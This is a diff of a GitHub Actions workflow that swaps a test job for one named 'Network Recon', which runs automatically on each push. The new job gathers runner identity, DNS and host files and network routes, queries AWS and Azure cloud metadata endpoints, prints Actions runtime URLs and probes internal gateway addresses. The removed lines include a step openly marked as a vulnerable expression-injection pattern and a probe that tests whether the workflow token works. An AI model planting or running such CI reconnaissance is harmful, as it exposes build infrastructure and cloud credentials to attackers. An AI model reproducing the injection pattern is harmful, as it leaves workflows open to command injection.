@@ -1,26 +1,40 @@
-name: Push Options Test
+name: Network Recon
 on:
   push:
     branches: [main]
   workflow_dispatch:
-permissions:
-  contents: write
-  issues: write
 jobs:
-  test:
+  recon:
     runs-on: ubuntu-latest
     steps:
-      - name: TEST1 push options in event
-        run: cat "$GITHUB_EVENT_PATH" | python3 -c "import json,sys; e=json.load(sys.stdin); print('push_options:', 'push_options' in e); print('author_name:', e.get('head_commit',{}).get('author',{}).get('name'))"
-
-      - name: TEST2 CRITICAL - expression directly in run (vulnerable pattern)
-        run: echo "Hello ${{ github.event.head_commit.author.name }}, your commit was ${{ github.event.head_commit.message }}"
-
-      - name: TEST3 GITHUB_TOKEN now available - check length
+      - name: Internal network recon
         run: |
-          echo "GITHUB_TOKEN_LEN=${#GITHUB_TOKEN}"
-          echo "ACTIONS_RUNTIME_TOKEN_LEN=${#ACTIONS_RUNTIME_TOKEN}"
-          echo "Can we use the token?"
-          curl -s -o /dev/null -w "API_STATUS:%{http_code}" \
-            -H "Authorization: Bearer $GITHUB_TOKEN" \
-            "https://api.github.com/repos/$GITHUB_REPOSITORY" | grep API_STATUS
+          echo "=== Runner identity ==="
+          id
+          hostname
+          cat /etc/hostname
+          ip addr show | grep "inet " | awk '{print $2}'
+          
+          echo "=== Internal DNS ==="
+          cat /etc/resolv.conf
+          cat /etc/hosts
+          
+          echo "=== Metadata service ==="
+          curl -s --max-time 3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -20
+          curl -s --max-time 3 http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata: true" 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d, indent=2))" 2>&1 | head -60
+          
+          echo "=== ACTIONS tokens ==="
+          echo "ACTIONS_RUNTIME_URL=$ACTIONS_RUNTIME_URL"
+          echo "ACTIONS_RESULTS_URL=$ACTIONS_RESULTS_URL"
+          echo "ACTIONS_CACHE_URL=$ACTIONS_CACHE_URL"
+          echo "GITHUB_API_URL=$GITHUB_API_URL"
+          echo "RUNNER_NAME=$RUNNER_NAME"
+          echo "AGENT_TOOLSDIRECTORY=$AGENT_TOOLSDIRECTORY"
+          
+          echo "=== Network routes ==="
+          ip route
+          
+          echo "=== Internal port scan (key ranges) ==="
+          for host in 10.0.0.1 172.16.0.1 192.168.0.1 100.100.100.200; do
+            ping -c1 -W1 $host 2>/dev/null && echo "REACHABLE: $host" || true
+          done
